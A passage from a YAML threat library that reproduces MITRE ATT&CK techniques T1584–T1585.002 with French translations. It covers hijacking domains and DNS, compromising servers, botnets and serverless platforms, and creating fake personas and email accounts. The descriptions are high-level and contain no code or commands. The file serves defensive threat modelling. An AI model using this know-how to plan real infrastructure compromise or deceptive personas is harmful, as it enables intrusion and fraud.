          \ (Citation : Voisine le plus proche Volexity)\n\nEn utilisant une infrastructure\
          \ compromise, les adversaires peuvent permettre des op\xE9rations malveillantes\
          \ ult\xE9rieures. Avant de cibler, les adversaires peuvent \xE9galement\
          \ compromettre l\u2019infrastructure d\u2019autres adversaires. (Citation\
          \ : NSA NCSC Turla OilRig)\nhttps://attack.mitre.org/techniques/T1584"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.001
    ref_id: T1584.001
    name: Domains
    description: 'Adversaries may hijack domains and/or subdomains that can be used
      during targeting. Domain registration hijacking is the act of changing the registration
      of a domain name without the permission of the original registrant.(Citation:
      ICANNDomainNameHijacking) Adversaries may gain access to an email account for
      the person listed as the owner of the domain. The adversary can then claim that
      they forgot their password in order to make changes to the domain registration.
      Other possibilities include social engineering a domain registration help desk
      to gain access to an account, taking advantage of renewal process gaps, or compromising
      a cloud service that enables managing domains (e.g., AWS Route53).(Citation:
      Krebs DNS Hijack 2019)


      Subdomain hijacking can occur when organizations have DNS entries that point
      to non-existent or deprovisioned resources. In such cases, an adversary may
      take control of a subdomain to conduct operations with the benefit of the trust
      associated with that domain.(Citation: Microsoft Sub Takeover 2020)


      Adversaries who compromise a domain may also engage in domain shadowing by creating
      malicious subdomains under their control while keeping any existing DNS records.
      As service will not be disrupted, the malicious subdomains may go unnoticed
      for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)

      https://attack.mitre.org/techniques/T1584/001'
    translations:
      fr:
        name: Domaines
        description: "Les adversaires peuvent d\xE9tourner des domaines et/ou sous-domaines\
          \ qui peuvent \xEAtre utilis\xE9s lors du ciblage. Le d\xE9tournement d\u2019\
          enregistrement de domaine consiste \xE0 modifier l\u2019enregistrement d\u2019\
          un nom de domaine sans l\u2019autorisation du titulaire d\u2019origine.\
          \ (Citation : ICANNDomainNameHijacking) Les adversaires peuvent acc\xE9\
          der \xE0 un compte email de la personne indiqu\xE9e comme propri\xE9taire\
          \ du domaine. L\u2019adversaire peut alors pr\xE9tendre avoir oubli\xE9\
          \ son mot de passe afin d\u2019apporter des modifications \xE0 l\u2019enregistrement\
          \ du domaine. D\u2019autres possibilit\xE9s incluent l\u2019ing\xE9nierie\
          \ sociale d\u2019un service d\u2019assistance \xE0 l\u2019enregistrement\
          \ de domaines pour acc\xE9der \xE0 un compte, profiter des interruptions\
          \ de processus de renouvellement, ou compromettre un service cloud permettant\
          \ de g\xE9rer des domaines (par exemple, AWS Route53). (Citation : D\xE9\
          tournement DNS de Krebs 2019)\n\nLe d\xE9tournement de sous-domaine peut\
          \ se produire lorsque les organisations disposent d\u2019entr\xE9es DNS\
          \ pointant vers des ressources inexistantes ou d\xE9provisionn\xE9es. Dans\
          \ de tels cas, un adversaire peut prendre le contr\xF4le d\u2019un sous-domaine\
          \ pour effectuer des op\xE9rations au b\xE9n\xE9fice de la fiducie associ\xE9\
          e \xE0 ce domaine. (Citation : Microsoft Sub Acquisition 2020)\n\nLes adversaires\
          \ qui compromettent un domaine peuvent \xE9galement pratiquer l\u2019ombrage\
          \ de domaine en cr\xE9ant des sous-domaines malveillants sous leur contr\xF4\
          le tout en conservant les enregistrements DNS existants. Comme le service\
          \ ne sera pas perturb\xE9, les sous-domaines malveillants peuvent passer\
          \ inaper\xE7us pendant de longues p\xE9riodes. (Citation : Shadowing du\
          \ domaine Palo Alto Unit 42 2022)\nhttps://attack.mitre.org/techniques/T1584/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.002
    ref_id: T1584.002
    name: DNS Server
    description: 'Adversaries may compromise third-party DNS servers that can be used
      during targeting. During post-compromise activity, adversaries may utilize DNS
      traffic for various tasks, including for Command and Control (ex: [Application
      Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting
      up their own DNS servers, adversaries may compromise third-party DNS servers
      in support of operations.


      By compromising DNS servers, adversaries can alter DNS records. Such control
      can allow for redirection of an organization''s traffic, facilitating Collection
      and Credential Access efforts for the adversary.(Citation: Talos DNSpionage
      Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may
      leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)
      to redirect traffic to adversary-controlled infrastructure, mimicking normal
      trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation:
      Crowdstrike DNS Hijack 2019) Alternatively, they may be able to prove ownership
      of a domain to a SaaS service in order to assert control of the service or create
      a new administrative [Cloud Account](https://attack.mitre.org/techniques/T1136/003).(Citation:
      CyberCX SaaS Domain Hijacking 2025) Adversaries may also be able to silently
      create subdomains pointed at malicious servers without tipping off the actual
      owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain
      Shadowing)

      https://attack.mitre.org/techniques/T1584/002'
    translations:
      fr:
        name: Serveur DNS
        description: "Les adversaires peuvent compromettre les serveurs DNS tiers\
          \ qui peuvent \xEAtre utilis\xE9s lors du ciblage. Lors d\u2019une activit\xE9\
          \ post-compromis, les adversaires peuvent utiliser le trafic DNS pour diverses\
          \ t\xE2ches, notamment pour la Commande et le Contr\xF4le (ex : [Application\
          \ Layer Protocol](https://attack.mitre.org/techniques/T1071)). Au lieu de\
          \ mettre en place leurs propres serveurs DNS, les adversaires peuvent compromettre\
          \ des serveurs DNS tiers pour soutenir les op\xE9rations.\n\nEn compromettant\
          \ les serveurs DNS, les adversaires peuvent modifier les enregistrements\
          \ DNS. Un tel contr\xF4le peut permettre de rediriger le trafic d\u2019\
          une organisation, facilitant ainsi les efforts de collecte et d\u2019acc\xE8\
          s aux accr\xE9ditations pour l\u2019adversaire. (Citation : Talos DNSpionage\
          \ nov. 2018)(Citation : D\xE9tournement DNS FireEye 2019)  De plus, les\
          \ adversaires peuvent utiliser ce contr\xF4le en conjonction avec les [Certificats\
          \ num\xE9riques](https://attack.mitre.org/techniques/T1588/004) pour rediriger\
          \ le trafic vers une infrastructure contr\xF4l\xE9e par l\u2019adversaire,\
          \ imitant ainsi les communications r\xE9seau de confiance normales. (Citation\
          \ : D\xE9tournement DNS FireEye 2019)(Citation : D\xE9tournement DNS par\
          \ crowdstrike 2019) Sinon, ils peuvent prouver la propri\xE9t\xE9 d\u2019\
          un domaine \xE0 un service SaaS afin d\u2019en prendre le contr\xF4le ou\
          \ cr\xE9er un nouveau [Compte Cloud](https://attack.mitre.org/techniques/T1136/003).\
          \ (Citation : D\xE9tournement de domaine SaaS CyberCX 2025) Les adversaires\
          \ peuvent \xE9galement cr\xE9er silencieusement des sous-domaines point\xE9\
          s vers des serveurs malveillants sans alerter le v\xE9ritable propri\xE9\
          taire du serveur DNS. (Citation : CiscoAngler)(Citation : Ombrage du domaine\
          \ Proofpoint)\nhttps://attack.mitre.org/techniques/T1584/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.003
    ref_id: T1584.003
    name: Virtual Private Server
    description: 'Adversaries may compromise third-party Virtual Private Servers (VPSs)
      that can be used during targeting. There exist a variety of cloud service providers
      that will sell virtual machines/containers as a service. Adversaries may compromise
      VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure,
      adversaries can make it difficult to physically tie back operations to themselves.(Citation:
      NSA NCSC Turla OilRig)


      Compromising a VPS for use in later stages of the adversary lifecycle, such
      as Command and Control, can allow adversaries to benefit from the ubiquity and
      trust associated with higher reputation cloud service providers as well as that
      added by the compromised third-party.

      https://attack.mitre.org/techniques/T1584/003'
    translations:
      fr:
        name: "Serveur priv\xE9 virtuel"
        description: "Les adversaires peuvent compromettre les serveurs priv\xE9s\
          \ virtuels (VPS) tiers qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ Il existe une vari\xE9t\xE9 de fournisseurs de services cloud qui vendent\
          \ des machines virtuelles/conteneurs en tant que service. Les adversaires\
          \ peuvent compromettre les VPS achet\xE9s par des entit\xE9s tierces. En\
          \ compromettant un VPS pour l\u2019utiliser comme infrastructure, les adversaires\
          \ peuvent rendre difficile le lien physique des op\xE9rations avec eux-m\xEA\
          mes. (Citation : NSA NCSC Turla OilRig)\n\nCompromettre un VPS pour une\
          \ utilisation aux derni\xE8res \xE9tapes du cycle de vie de l\u2019adversaire,\
          \ comme Command and Control, peut permettre aux adversaires de b\xE9n\xE9\
          ficier de l\u2019ubiquit\xE9 et de la confiance associ\xE9es aux fournisseurs\
          \ de services cloud de meilleure r\xE9putation, ainsi qu\u2019\xE0 celles\
          \ ajout\xE9es par le tiers compromis.\nhttps://attack.mitre.org/techniques/T1584/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.004
    ref_id: T1584.004
    name: Server
    description: 'Adversaries may compromise third-party servers that can be used
      during targeting. Use of servers allows an adversary to stage, launch, and execute
      an operation. During post-compromise activity, adversaries may utilize servers
      for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca
      2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004)
      or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003),
      adversaries may compromise third-party servers in support of operations.


      Adversaries may also compromise web servers to support watering hole operations,
      as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email
      servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.

      https://attack.mitre.org/techniques/T1584/004'
    translations:
      fr:
        name: Serveur
        description: "Les adversaires peuvent compromettre des serveurs tiers qui\
          \ peuvent \xEAtre utilis\xE9s lors du ciblage. L\u2019utilisation de serveurs\
          \ permet \xE0 un adversaire de mettre en sc\xE8ne, de lancer et d\u2019\
          ex\xE9cuter une op\xE9ration. Lors des activit\xE9s post-compromis, les\
          \ adversaires peuvent utiliser des serveurs pour diverses t\xE2ches, y compris\
          \ pour le Commandement et le Contr\xF4le. (Citation : TrendMicro EarthLusca\
          \ 2022) Au lieu d\u2019acheter un [Serveur](https://attack.mitre.org/techniques/T1583/004)\
          \ ou un [Serveur Priv\xE9 Virtuel](https://attack.mitre.org/techniques/T1583/003),\
          \ les adversaires peuvent compromettre des serveurs tiers pour soutenir\
          \ les op\xE9rations.\n\nLes adversaires peuvent \xE9galement compromettre\
          \ les serveurs web pour soutenir les op\xE9rations de watering, comme dans\
          \ le cas de [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
          \ ou des serveurs de messagerie pour soutenir les op\xE9rations de [phishing](https://attack.mitre.org/techniques/T1566).\n\
          https://attack.mitre.org/techniques/T1584/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.005
    ref_id: T1584.005
    name: Botnet
    description: "Adversaries may compromise numerous third-party systems to form\
      \ a botnet\_that can be used during targeting. A botnet is a network of compromised\
      \ systems that can be instructed to perform coordinated tasks.(Citation: Norton\
      \ Botnet) Instead of purchasing/renting a botnet from a booter/stresser service,\
      \ adversaries may build their own botnet by compromising numerous third-party\
      \ systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover\
      \ of an existing botnet, such as redirecting bots to adversary-controlled C2\
      \ servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal,\
      \ adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ or Distributed Denial of Service (DDoS).\nhttps://attack.mitre.org/techniques/T1584/005"
    translations:
      fr:
        name: Botnet
        description: "Les adversaires peuvent compromettre de nombreux syst\xE8mes\
          \ tiers pour former un botnet pouvant \xEAtre utilis\xE9 lors du ciblage.\
          \ Un botnet est un r\xE9seau de syst\xE8mes compromis qui peuvent \xEAtre\
          \ instruits pour effectuer des t\xE2ches coordonn\xE9es. (Citation : Norton\
          \ Botnet) Au lieu d\u2019acheter ou de louer un botnet aupr\xE8s d\u2019\
          un service booter/stresser, les adversaires peuvent cr\xE9er leur propre\
          \ botnet en compromettant de nombreux syst\xE8mes tiers. (Citation : Imperva\
          \ DDoS \xE0 louer) Les adversaires peuvent \xE9galement effectuer une prise\
          \ de contr\xF4le d\u2019un botnet existant, comme rediriger les bots vers\
          \ des serveurs C2 contr\xF4l\xE9s par l\u2019adversaire. (Citation : Dell\
          \ Dridex, oct. 2015) Avec un botnet \xE0 leur disposition, les adversaires\
          \ peuvent effectuer des activit\xE9s de suivi telles que le [phishing](https://attack.mitre.org/techniques/T1566)\
          \ ou le d\xE9ni de service distribu\xE9 (DDoS).\nhttps://attack.mitre.org/techniques/T1584/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.006
    ref_id: T1584.006
    name: Web Services
    description: "Adversaries may compromise access to third-party web services\_\
      that can be used during targeting. A variety of popular websites exist for legitimate\
      \ users to register for web-based services, such as GitHub, Twitter, Dropbox,\
      \ Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate\
      \ user's access to a web service and use that web service as infrastructure\
      \ in support of cyber operations. Such web services can be abused during later\
      \ stages of the adversary lifecycle, such as during Command and Control ([Web\
      \ Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web\
      \ Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation:\
      \ Recorded Future Turla Infra 2020) Using common services, such as those offered\
      \ by Google or Twitter, makes it easier for adversaries to hide in expected\
      \ noise. By utilizing a web service, particularly when access is stolen from\
      \ legitimate users, adversaries can make it difficult to physically tie back\
      \ operations to them. Additionally, leveraging compromised web-based email services\
      \ may allow adversaries to leverage the trust associated with legitimate domains.\n\
      https://attack.mitre.org/techniques/T1584/006"
    translations:
      fr:
        name: Web Services
        description: "Les adversaires peuvent compromettre l\u2019acc\xE8s \xE0 des\
          \ services web tiers qui peuvent \xEAtre utilis\xE9s lors du ciblage. Une\
          \ vari\xE9t\xE9 de sites web populaires permettent aux utilisateurs l\xE9\
          gitimes de s\u2019inscrire \xE0 des services web, tels que GitHub, Twitter,\
          \ Dropbox, Google, SendGrid, etc. Les adversaires peuvent tenter de s\u2019\
          approprier l\u2019acc\xE8s d\u2019un utilisateur l\xE9gitime \xE0 un service\
          \ web et utiliser ce service web comme infrastructure pour soutenir des\
          \ op\xE9rations cybern\xE9tiques. Ces services web peuvent \xEAtre abus\xE9\
          s lors des \xE9tapes ult\xE9rieures du cycle de vie de l\u2019adversaire,\
          \ comme lors de Command and Control ([Service Web](https://attack.mitre.org/techniques/T1102)),\
          \ [Exfiltration via Web Service](https://attack.mitre.org/techniques/T1567)\
          \ ou [Phishing](https://attack.mitre.org/techniques/T1566). (Citation :\
          \ Recorded Future Turla Infra 2020) L\u2019utilisation de services courants,\
          \ tels que ceux propos\xE9s par Google ou Twitter, facilite la dissimulation\
          \ des adversaires dans le bruit attendu. En utilisant un service web, en\
          \ particulier lorsque l\u2019acc\xE8s est vol\xE9 \xE0 des utilisateurs\
          \ l\xE9gitimes, les adversaires peuvent rendre difficile le lien physique\
          \ des op\xE9rations avec eux. De plus, exploiter des services de messagerie\
          \ web compromis peut permettre aux adversaires de tirer parti de la confiance\
          \ li\xE9e aux domaines l\xE9gitimes.\nhttps://attack.mitre.org/techniques/T1584/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.007
    ref_id: T1584.007
    name: Serverless
    description: "Adversaries may compromise serverless cloud infrastructure, such\
      \ as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that\
      \ can be used during targeting. By utilizing serverless infrastructure, adversaries\
      \ can make it more difficult to attribute infrastructure used during operations\
      \ back to them. \n\nOnce compromised, the serverless runtime environment can\
      \ be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)\
      \ traffic to an adversary-owned command and control server.(Citation: BlackWater\
      \ Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS\
      \ Apps Script Abuse 2021) As traffic generated by these functions will appear\
      \ to come from subdomains of common cloud providers, it may be difficult to\
      \ distinguish from ordinary traffic to these providers - making it easier to\
      \ [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:\
      \ Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare\
      \ Workers)\nhttps://attack.mitre.org/techniques/T1584/007"
    translations:
      fr:
        name: Serverless
        description: "Les adversaires peuvent compromettre l\u2019infrastructure cloud\
          \ serverless, telle que Cloudflare Workers, AWS Lambda functions ou Google\
          \ Apps Scripts, qui peuvent \xEAtre utilis\xE9s lors du ciblage. En utilisant\
          \ une infrastructure serverless, les adversaires peuvent rendre plus difficile\
          \ l\u2019attribution des infrastructures utilis\xE9es pendant les op\xE9\
          rations. \n\nUne fois compromis, l\u2019environnement d\u2019ex\xE9cution\
          \ serverless peut \xEAtre exploit\xE9 pour r\xE9pondre directement aux machines\
          \ infect\xE9es ou au trafic [proxy](https://attack.mitre.org/techniques/T1090)\
          \ vers un serveur de commande et de contr\xF4le appartenant \xE0 l\u2019\
          adversaire. (Citation : Travailleurs de Cloudflare du malware Blackwater)(Citation\
          \ : Redirecteur AWS Lambda)(Citation : Abus de script des applications GWS\
          \ 2021) Comme le trafic g\xE9n\xE9r\xE9 par ces fonctions semblera provenir\
          \ de sous-domaines de fournisseurs cloud courants, il peut \xEAtre difficile\
          \ de distinguer le trafic ordinaire vers ces fournisseurs \u2013 ce qui\
          \ facilite la mise en place de [Masquer l\u2019infrastructure](https://attack.mitre.org/techniques/T1665).\
          \ (Citation : D\xE9tection du commandement et du contr\xF4le dans le cloud)(Citation\
          \ : Travailleurs de Cloudflare du malware Blackwater)\nhttps://attack.mitre.org/techniques/T1584/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.008
    ref_id: T1584.008
    name: Network Devices
    description: 'Adversaries may compromise third-party network devices that can
      be used during targeting. Network devices, such as small office/home office
      (SOHO) routers, may be compromised where the adversary''s ultimate goal is not
      [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment,
      but rather to leverage these devices to support additional targeting.


      Once an adversary has control, compromised network devices can be used to launch
      additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005))
      or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659)
      operations. Adversaries may also be able to harvest reusable credentials (i.e.,
      [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised
      network devices.


      Adversaries often target Internet-facing edge devices and related network appliances
      that specifically do not support robust host-based defenses.(Citation: Mandiant
      Fortinet Zero Day)(Citation: Wired Russia Cyberwar)


      Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011)
      activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665)
      through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or
      [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice
      GRU 2024)

      https://attack.mitre.org/techniques/T1584/008'
    translations:
      fr:
        name: "Dispositifs r\xE9seau"
        description: "Les adversaires peuvent compromettre des dispositifs r\xE9seau\
          \ tiers pouvant \xEAtre utilis\xE9s lors du ciblage. Les dispositifs r\xE9\
          seau, tels que les routeurs de petits bureaux/bureaux \xE0 domicile (SOHO),\
          \ peuvent \xEAtre compromis lorsque l\u2019objectif ultime de l\u2019adversaire\
          \ n\u2019est pas l'[Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001)\
          \ \xE0 cet environnement, mais plut\xF4t de tirer parti de ces appareils\
          \ pour supporter un ciblage suppl\xE9mentaire.\n\nUne fois qu\u2019un adversaire\
          \ a le contr\xF4le, les dispositifs r\xE9seau compromis peuvent \xEAtre\
          \ utilis\xE9s pour lancer des op\xE9rations suppl\xE9mentaires, telles que\
          \ l\u2019h\xE9bergement de charges utiles pour des campagnes [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ (c\u2019est-\xE0-dire [Cible de Lien](https://attack.mitre.org/techniques/T1608/005))\
          \ ou l\u2019activation de l\u2019acc\xE8s n\xE9cessaire pour ex\xE9cuter\
          \ des op\xE9rations d'[Injection de contenu](https://attack.mitre.org/techniques/T1659).\
          \ Les adversaires peuvent \xE9galement \xEAtre capables de r\xE9colter des\
          \ identifiants r\xE9utilisables (c\u2019est-\xE0-dire [Comptes valides](https://attack.mitre.org/techniques/T1078))\
          \ \xE0 partir de dispositifs r\xE9seau compromis.\n\nLes adversaires ciblent\
          \ souvent des dispositifs de p\xE9riph\xE9rie connect\xE9s \xE0 Internet\
          \ et des appareils r\xE9seau associ\xE9s qui ne supportent sp\xE9cifiquement\
          \ pas de d\xE9fenses robustes bas\xE9es sur l\u2019h\xF4te. (Citation :\
          \ Mandiant Fortinet Zero Day)(Citation : Cyberguerre de la Russie c\xE2\
          bl\xE9e)\n\nLes dispositifs r\xE9seau compromis peuvent \xEAtre utilis\xE9\
          s pour soutenir une activit\xE9 ult\xE9rieure de [Commande et Contr\xF4\
          le](https://attack.mitre.org/tactics/TA0011), telle que [Masquer l\u2019\
          infrastructure](https://attack.mitre.org/techniques/T1665) via un r\xE9\
          seau \xE9tabli [Proxy](https://attack.mitre.org/techniques/T1090) et/ou\
          \ [Botnet](https://attack.mitre.org/techniques/T1584/005). (Citation : Justice\
          \ GRU 2024)\nhttps://attack.mitre.org/techniques/T1584/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585
    ref_id: T1585
    name: Establish Accounts
    description: 'Adversaries may create and cultivate accounts with services that
      can be used during targeting. Adversaries can create accounts that can be used
      to build a persona to further operations. Persona development consists of the
      development of public information, presence, history and appropriate affiliations.
      This development could be applied to social media, website, or other publicly
      available information that could be referenced and scrutinized for legitimacy
      over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation:
      BlackHatRobinSage)


      For operations incorporating social engineering, the utilization of an online
      persona may be important. These personas may be fictitious or impersonate real
      people. The persona may exist on a single site or across multiple sites (ex:
      Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing
      a persona may require development of additional documentation to make them seem
      real. This could include filling out profile information, developing social
      networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)


      Establishing accounts can also include the creation of accounts with email providers,
      which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant
      APT1) In addition, establishing accounts may allow adversaries to abuse free
      services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      for malicious purposes.(Citation: Free Trial PurpleUrchin)

      https://attack.mitre.org/techniques/T1585'
    translations:
      fr:
        name: "\xC9tablir des comptes"
        description: "Les adversaires peuvent cr\xE9er et cultiver des comptes avec\
          \ des services pouvant \xEAtre utilis\xE9s lors du ciblage. Les adversaires\
          \ peuvent cr\xE9er des comptes qui servent \xE0 construire une persona pour\
          \ faire avancer leurs op\xE9rations. Le d\xE9veloppement de la persona consiste\
          \ \xE0 d\xE9velopper des informations publiques, une pr\xE9sence, son histoire\
          \ et des affiliations appropri\xE9es. Ce d\xE9veloppement pourrait \xEA\
          tre appliqu\xE9 aux r\xE9seaux sociaux, sites web ou autres informations\
          \ publiques qui pourraient \xEAtre r\xE9f\xE9renc\xE9es et examin\xE9es\
          \ pour leur l\xE9gitimit\xE9 au cours d\u2019une op\xE9ration utilisant\
          \ cette identit\xE9 ou personnalit\xE9. (Citation : NEWSCASTER2014)(Citation\
          \ : BlackHatRobinSage)\n\nPour les op\xE9rations int\xE9grant l\u2019ing\xE9\
          nierie sociale, l\u2019utilisation d\u2019un persona en ligne peut \xEA\
          tre importante. Ces personnages peuvent \xEAtre fictifs ou se faire passer\
          \ pour de vraies personnes. La persona peut exister sur un seul site ou\
          \ sur plusieurs sites (ex : Facebook, LinkedIn, Twitter, Google, GitHub,\
          \ Docker Hub, etc.). \xC9tablir un personnage peut n\xE9cessiter l\u2019\
          \xE9laboration de documents suppl\xE9mentaires pour qu\u2019il para\xEE\
          t r\xE9el. Cela peut inclure la remplissage des informations de profil,\
          \ le d\xE9veloppement de r\xE9seaux sociaux ou l\u2019int\xE9gration de\
          \ photos. (Citation : NEWSCASTER2014)(Citation : BlackHatRobinSage)\n\n\
          La cr\xE9ation de comptes peut \xE9galement inclure la cr\xE9ation de comptes\
          \ aupr\xE8s des fournisseurs de messagerie, qui peuvent \xEAtre directement\
          \ exploit\xE9s pour [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Phishing](https://attack.mitre.org/techniques/T1566). (Citation :\
          \ Mandiant APT1) De plus, cr\xE9er des comptes peut permettre aux adversaires\
          \ d\u2019abuser de services gratuits, comme l\u2019enregistrement pour des\
          \ p\xE9riodes d\u2019essai aupr\xE8s de [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
          \ \xE0 des fins malveillantes. (Citation : Essai gratuit PurpleUrchin)\n\
          https://attack.mitre.org/techniques/T1585"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.001
    ref_id: T1585.001
    name: Social Media Accounts
    description: "Adversaries may create and cultivate social media accounts that\
      \ can be used during targeting. Adversaries can create social media accounts\
      \ that can be used to build a persona to further operations. Persona development\
      \ consists of the development of public information, presence, history and appropriate\
      \ affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor\
      \ operations incorporating social engineering, the utilization of a persona\
      \ on social media may be important. These personas may be fictitious or impersonate\
      \ real people. The persona may exist on a single social media site or across\
      \ multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona\
      \  on social media may require development of additional documentation to make\
      \ them seem real. This could include filling out profile information, developing\
      \ social networks, or incorporating photos. \n\nOnce a persona has been developed\
      \ an adversary can use it to create connections to targets of interest. These\
      \ connections may be direct or may include trying to connect through others.(Citation:\
      \ NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged\
      \ during other phases of the adversary lifecycle, such as during Initial Access\
      \ (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).\n\
      https://attack.mitre.org/techniques/T1585/001"
    translations:
      fr:
        name: "Comptes sur les r\xE9seaux sociaux"
        description: "Les adversaires peuvent cr\xE9er et cultiver des comptes sur\
          \ les r\xE9seaux sociaux qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ Les adversaires peuvent cr\xE9er des comptes sur les r\xE9seaux sociaux\
          \ qui servent \xE0 construire une persona pour faire avancer leurs op\xE9\
          rations. Le d\xE9veloppement de la persona consiste \xE0 d\xE9velopper des\
          \ informations publiques, une pr\xE9sence, son histoire et des affiliations\
          \ appropri\xE9es. (Citation : NEWSCASTER2014)(Citation : BlackHatRobinSage)\n\
          \nPour les op\xE9rations int\xE9grant l\u2019ing\xE9nierie sociale, l\u2019\
          utilisation d\u2019un persona sur les r\xE9seaux sociaux peut \xEAtre importante.\
          \ Ces personnages peuvent \xEAtre fictifs ou se faire passer pour de vraies\
          \ personnes. La persona peut exister sur un seul r\xE9seau social ou sur\
          \ plusieurs sites (par exemple : Facebook, LinkedIn, Twitter, etc.). \xC9\
          tablir un personnage sur les r\xE9seaux sociaux peut n\xE9cessiter le d\xE9\
          veloppement de documents suppl\xE9mentaires pour les rendre r\xE9els. Cela\
          \ peut inclure la remplissage des informations de profil, le d\xE9veloppement\
          \ de r\xE9seaux sociaux ou l\u2019int\xE9gration de photos. \n\nUne fois\
          \ qu\u2019un persona a \xE9t\xE9 d\xE9velopp\xE9, un adversaire peut l\u2019\
          utiliser pour cr\xE9er des liens avec des cibles d\u2019int\xE9r\xEAt. Ces\
          \ liens peuvent \xEAtre directs ou inclure une tentative de connexion \xE0\
          \ travers les autres. (Citation : NEWSCASTER2014)(Citation : BlackHatRobinSage)\
          \ Ces comptes peuvent \xEAtre exploit\xE9s lors d\u2019autres phases du\
          \ cycle de vie de l\u2019adversaire, comme lors de l\u2019Acc\xE8s Initial\
          \ (ex : [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).\n\
          https://attack.mitre.org/techniques/T1585/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.002
    ref_id: T1585.002
    name: Email Accounts
    description: "Adversaries may create email accounts that can be used during targeting.\
      \ Adversaries can use accounts created with email providers to further their\
      \ operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant\
      \ APT1) Establishing email accounts may also allow adversaries to abuse free\
      \ services \u2013 such as trial periods \u2013 to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ for follow-on purposes.(Citation: Free Trial PurpleUrchin)\n\nAdversaries\
      \ may also take steps to cultivate a persona around the email account, such\
      \ as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001),\
      \ to increase the chance of success of follow-on behaviors. Created email accounts\
      \ can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation:\
      \ Mandiant APT1)\n\nTo decrease the chance of physically tying back operations\
      \ to themselves, adversaries may make use of disposable email services.(Citation:\
      \ Trend Micro R980 2016)\nhttps://attack.mitre.org/techniques/T1585/002"
    translations:
      fr:
        name: Comptes e-mail
        description: "Les adversaires peuvent cr\xE9er des comptes e-mail qui peuvent\
          \ \xEAtre utilis\xE9s lors du ciblage. Les adversaires peuvent utiliser\
          \ des comptes cr\xE9\xE9s aupr\xE8s des fournisseurs de messagerie pour\
          \ faire avancer leurs op\xE9rations, par exemple en les exploitant pour\
          \ effectuer des [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
          \ ou [Phishing](https://attack.mitre.org/techniques/T1566). (Citation :\
          \ Mandiant APT1) La cr\xE9ation de comptes e-mail peut \xE9galement permettre\
          \ aux adversaires d\u2019abuser de services gratuits \u2013 tels que les\
          \ p\xE9riodes d\u2019essai \u2013 pour [Acqu\xE9rir des infrastructures](https://attack.mitre.org/techniques/T1583)\
          \ \xE0 des fins ult\xE9rieures. (Citation : Essai gratuit PurpleUrchin)\n\
          \nLes adversaires peuvent \xE9galement prendre des mesures pour cultiver\
